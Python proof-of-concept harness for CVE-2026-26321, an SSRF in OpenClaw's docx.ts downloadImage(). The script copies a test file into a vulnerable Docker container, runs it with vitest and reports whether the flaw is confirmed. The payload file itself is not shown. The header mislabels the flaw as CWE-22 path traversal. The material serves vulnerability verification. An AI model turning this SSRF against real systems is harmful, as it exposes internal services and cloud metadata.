#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenClaw < 2026.2.14 - SSRF via docx.ts downloadImage()
# CVE            : CVE-2026-26321
# Vendor         : OpenClaw
# Product        : OpenClaw
# Affected       : < 2026.2.14
# Type           : CWE-22 - Path Traversal
# CVSS           : 7.5 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-26321 — PoC Vector 3: SSRF via downloadImage() in docx.ts

The downloadImage() function in extensions/feishu/src/docx.ts calls fetch(url) on
URLs extracted from markdown image references (![alt](url)) without any SSRF
validation. Attacker-controlled markdown content can trigger requests to internal
services, cloud metadata, and other private endpoints.

Usage:
    python3 poc_vector3_docx_ssrf.py [container_name]
"""

import subprocess
import sys
import os


CONTAINER_NAME = "cve-2026-26321-vulnerable"
POC_TEST_FILE = "poc_vector3_docx_ssrf.test.ts"
CONTAINER_TEST_PATH = f"/app/extensions/feishu/src/{POC_TEST_FILE}"
VITEST_CONFIG = "vitest.extensions.config.ts"


def main():
    container = sys.argv[1] if len(sys.argv) > 1 else CONTAINER_NAME

    print("""
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-26321 — Vector 3: SSRF via docx.ts downloadImage  ║
║  Markdown image URLs fetched without SSRF protection          ║
╚══════════════════════════════════════════════════════════════╝
""")

    poc_src = os.path.join(os.path.dirname(os.path.abspath(__file__)), POC_TEST_FILE)
    if not os.path.exists(poc_src):
        print(f"[!] Test file not found: {poc_src}")
        sys.exit(1)

    subprocess.run(
        f"docker cp {poc_src} {container}:{CONTAINER_TEST_PATH}",
        shell=True, check=True
    )
    print(f"[+] Deployed {POC_TEST_FILE} to container")

    try:
        result = subprocess.run(
            f"docker exec {container} npx vitest run "
            f"extensions/feishu/src/{POC_TEST_FILE} "
            f"--config {VITEST_CONFIG} --reporter verbose",
            shell=True, capture_output=True, text=True, timeout=120
        )
        print(result.stdout)
        if result.stderr:
            print(result.stderr)

        if result.returncode == 0:
            print("[CONFIRMED] SSRF via docx.ts downloadImage() — bare fetch() on markdown image URLs")
        else:
            print("[UNVERIFIED] Test did not pass as expected")

        return result.returncode
    finally:
        subprocess.run(
            f"docker exec {container} rm -f {CONTAINER_TEST_PATH}",
            shell=True, capture_output=True
        )


if __name__ == "__main__":
    sys.exit(main())
